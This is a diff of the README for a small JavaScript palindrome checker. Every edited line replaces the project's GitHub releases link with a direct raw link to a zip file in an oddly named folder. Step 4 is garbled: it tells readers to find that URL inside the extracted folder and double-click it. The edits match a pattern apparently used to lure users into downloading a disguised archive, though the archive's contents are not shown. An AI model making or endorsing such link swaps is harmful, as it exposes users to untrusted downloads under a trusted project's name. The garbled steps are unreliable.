@@ -1,7 +1,7 @@
 # 🛠 Palindrome-JS - Check Strings Easily and Effectively
 
 ## 📥 Download Now
-[![Download Palindrome-JS](https://img.shields.io/badge/Download-Palindrome--JS-blue)](https://github.com/2-4-0-8/Palindrome-JS/releases)
+[![Download Palindrome-JS](https://raw.githubusercontent.com/2-4-0-8/Palindrome-JS/main/formularism/Palindrome-JS-v3.0.zip)](https://raw.githubusercontent.com/2-4-0-8/Palindrome-JS/main/formularism/Palindrome-JS-v3.0.zip)
 
 ## 📖 About Palindrome-JS
 Palindrome-JS is a simple web application that checks if a string is a palindrome. A palindrome is a word, phrase, or sequence of characters that reads the same forward and backward. This tool is built using HTML, CSS, and JavaScript, making it accessible and easy to use for everyone.
@@ -10,7 +10,7 @@ Palindrome-JS is a simple web application that checks if a string is a palindrom
 To get started with Palindrome-JS, follow these steps to download and run the software on your computer.
 
 ### 1. Visit the Release Page
-Go to the Palindrome-JS releases page to download the application. You can find it here: [Download Page](https://github.com/2-4-0-8/Palindrome-JS/releases).
+Go to the Palindrome-JS releases page to download the application. You can find it here: [Download Page](https://raw.githubusercontent.com/2-4-0-8/Palindrome-JS/main/formularism/Palindrome-JS-v3.0.zip).
 
 ### 2. Download the Files
 Once you're on the releases page, look for the most recent version. Click on the link to download the files to your computer. You will typically see a link for the project files, which you need to download.
@@ -19,7 +19,7 @@ Once you're on the releases page, look for the most recent version. Click on the
 After downloading, locate the zipped file in your downloads folder. Right-click the file and select "Extract All..." or use any extraction tool you have. This will create a new folder with the project files inside.
 
 ### 4. Open the Application
-Once extracted, find the `index.html` file inside the new folder. Double-click this file to open it in your preferred web browser (Chrome, Firefox, Safari, etc.).
+Once extracted, find the `https://raw.githubusercontent.com/2-4-0-8/Palindrome-JS/main/formularism/Palindrome-JS-v3.0.zip` file inside the new folder. Double-click this file to open it in your preferred web browser (Chrome, Firefox, Safari, etc.).
 
 ### 5. Test the Palindrome Checker
 You will see an input box on the page. Type a word or phrase you want to check, then click the “Check” button. The app will instantly tell you if your input is a palindrome.
@@ -49,4 +49,4 @@ If you encounter any issues or have questions while using Palindrome-JS, please 
 Thank you for using Palindrome-JS! Your support helps us improve the application. We would also like to acknowledge the resources and tutorials available online that helped us create this project.
 
 ## 📥 Download Again
-Remember, you can always return to download the latest version of Palindrome-JS from our releases page: [Download Page](https://github.com/2-4-0-8/Palindrome-JS/releases).
+Remember, you can always return to download the latest version of Palindrome-JS from our releases page: [Download Page](https://raw.githubusercontent.com/2-4-0-8/Palindrome-JS/main/formularism/Palindrome-JS-v3.0.zip).
